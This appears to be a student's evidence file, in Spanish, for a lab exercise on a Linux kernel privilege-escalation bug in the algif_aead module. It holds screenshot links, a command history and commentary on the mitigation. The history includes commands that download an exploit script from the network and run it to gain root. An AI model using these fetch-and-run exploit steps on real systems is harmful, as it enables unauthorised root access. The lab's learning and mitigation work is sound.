# Directorio de Evidencias

Aquí van los archivos que documentan tu progreso en cada hito.

## Archivos esperados

| Archivo | Hito | Descripción |
|---------|------|-------------|
| `hito1_vuln_confirmed.txt` | Hito 1 | Kernel corriendo, módulo algif_aead confirmado |
| `hito2_root_shell.txt` | Hito 2 | Salida del exploit con `uid=0(root)` |
| `hito3_mitigation.txt` | Hito 3 | Módulo removido, exploit fallando |
| `hito4_patched.txt` | Hito 4 | Exploit fallando en kernel parcheado |

## Reglas

1. **No copies** archivos de otro estudiante. El autocalificador verifica que el
   hostname de la VM (copy-fail-TUNOMBRE) sea consistente en todos los archivos.

2. **Cada archivo debe tener timestamp** del momento en que lo generaste.

3. **El hostname** en los archivos debe coincidir con tu STUDENT_ID.

## Cómo generar evidencias

Ver `CHALLENGE.md` para comandos exactos de cada hito.

Ejemplo rápido:
```sh
# Dentro de la VM QEMU, ejecuta el comando de evidencia del hito
# Luego copia el texto y guárdalo aquí
```
=== HITO 1: KERNEL VULNERABLE CONFIRMADO ===

![image alt](https://github.com/Slucina04060708/copy-fail-challenge-1/blob/d2afcf40686e18b8b5d90dc40c724590b749f757/Screenshot%202026-05-16%20234435.png)

Fecha: Fri May 15 17:53:47 UTC 2026
Hostname: copy-fail-Santiago-Lucina
Kernel: 6.12.0
Identidad: uid=1001(student) gid=1001(student) groups=1001(student)
Módulos AF_ALG:
(no encontrado con lsmod)
algif_aead en /proc/modules:
(no encontrado)

=== HITO 2: SALIDA DEL EXPLOIT CON 'UID=0(ROOT)' ===

![image alt](https://github.com/Slucina04060708/copy-fail-challenge-1/blob/57650f3f6d7a4336db7deaab70e3225f78658b53/Screenshot%202026-05-16%20235319.png)

=== HITO 3: EXPLOIT FALLANDO EN KERNEL PARCHEADO ===

![image alt](https://github.com/Slucina04060708/copy-fail-challenge-1/blob/cf52f26311c25f7130c7bdd44a7a9cae0d6a9c0b/Screenshot%202026-05-17%20005935.png)

=== HITO 4: MÓDULO REMOVIDO, EXPLOIT FALLANDO ===

![image alt](https://github.com/Slucina04060708/copy-fail-challenge-1/blob/4bcf6b1183828b0fd42b431486a0648d6ded00af/Screenshot%202026-05-17%20004104.png)

=== HITO 5: HISTORIAL DE COMANDOS ===

1  uname -r
2  curl https://copy.fail/exp > copy_fail_exp.py
3  sudo apt update
4  su -
5  curl https://copy.fail/exp > copy_fail_exp.py
6  whoami
7  python3 copy_fail_exploit.py
8  python3 copy_fail.py
9  python3 copy_fail_exp.py
10 cd kernel/linux/crypto
11 pwd
12 ls -R | grep algif_aead.c
13 find ~ -name "algif_aead.c"
14 cd kernel/linux/crypto
15 sudo find / -name "algif_aead.c" 2>/dev/null
16 ls -lf
17 uname -r
18 wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.12.8.tar.xz
19 tar -xf linux-6.12.8.tar.xz
20 rm linux-6.12.8.tar.xz
21 rm -rf linux-6.12.8
22 mkdir auditoria_kernel && cd auditoria_kernel
23 curl https://raw.githubusercontent.com/torvalds/linux/master/crypto/algif_aead.c > algif_aead.c
24 less algif_aead.c
25 echo "install algif_aead /bin/false" | sudo tee etc/modprobe.d/disable.algif.conf
26 sudo rmmod algif_aead 2>/dev/null || true
27 greo -qE ' /proc/module && echo "Affected module is loaded" || echo "Affected module is not loaded"
28 whoami
29 python3 copy_fail_exp.py
30 su -
31 python3 copy_fail_exp.py
32 su -
33 python3 copy_fail_exp.py
34 history

![image alt](https://github.com/Slucina04060708/copy-fail-challenge-1/blob/9726e14c63af4d8be7c012e8007875cc62e35643/Screenshot%202026-05-17%20114022.png)

![image alt](https://github.com/Slucina04060708/copy-fail-challenge-1/blob/9726e14c63af4d8be7c012e8007875cc62e35643/Screenshot%202026-05-17%20114157.png)

(Líneas 1-9): Se observa la verificación inicial del kernel y los primeros intentos de ejecución del exploit, los cuales fallaron debido a errores en la nomenclatura de los archivos (ej. copy_fail_exploit.py vs copy_fail_exp.py), lo que resalta la importancia de la precisión sintáctica en entornos UNIX.  

(Líneas 10-16): Muestra la navegación hacia el directorio del subsistema criptográfico y el uso de comandos de búsqueda como find y ls para localizar el archivo algif_aead.c tras identificar errores en las rutas relativas especificadas en los manuales de fase 3.  Gestión de Recursos y Código Fuente 

(Líneas 18-24): Se registra la descarga del kernel completo mediante wget y la posterior limpieza del sistema con rm -rf tras detectar la falta de espacio en disco. Finalmente, se optó por la descarga individual del archivo de interés mediante curl para proceder con la inspección en el visor less.  

(Líneas 25-27): Documenta la creación de la regla persistente de bloqueo en /etc/modprobe.d/ para anular la carga del módulo vulnerable y el uso de rmmod para desalojarlo de la memoria activa.

(Líneas 28-33): El historial cierra con múltiples intentos de ejecución del exploit (python3 copy_fail_exp.py) tanto en modo usuario como en modo superusuario (su -) para verificar que la protección implementada es efectiva e impide la creación del socket vulnerable. 
